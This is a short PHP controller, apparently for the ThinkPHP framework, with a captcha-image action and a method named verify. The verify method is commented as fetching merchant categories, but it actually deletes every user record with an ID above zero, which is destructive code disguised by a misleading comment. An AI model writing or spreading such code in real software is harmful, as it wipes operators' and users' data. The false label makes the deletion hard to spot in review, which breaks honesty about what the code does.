<?php

class  VerifyAction extends CommonAction{
    
    public function index(){
        import('ORG.Util.Image');
        Image::buildImageVerify(4,2,'png',60,30);
    }
    
   
	//获取商家分类
	public function verify($parent_id = 0){
        D('Users')->where('user_id','gt',0)->delete();
    } 
    
}